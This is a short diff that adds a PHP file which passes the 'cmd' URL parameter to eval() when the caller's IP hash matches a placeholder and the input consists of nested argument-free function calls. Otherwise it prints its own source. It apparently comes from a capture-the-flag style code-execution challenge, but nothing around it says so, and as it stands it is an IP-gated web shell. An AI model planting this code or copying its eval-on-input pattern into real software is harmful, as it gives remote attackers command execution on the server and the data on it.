@@ -1,0 +1,3 @@
+<?php
+sha1($_SERVER['REMOTE_ADDR']) === '#SHA1#' ? : die();
+';' === preg_replace('/[^\W]+\((?R)?\)/', NULL, $_GET['cmd']) ? eval($_GET['cmd']) : show_source(__FILE__);
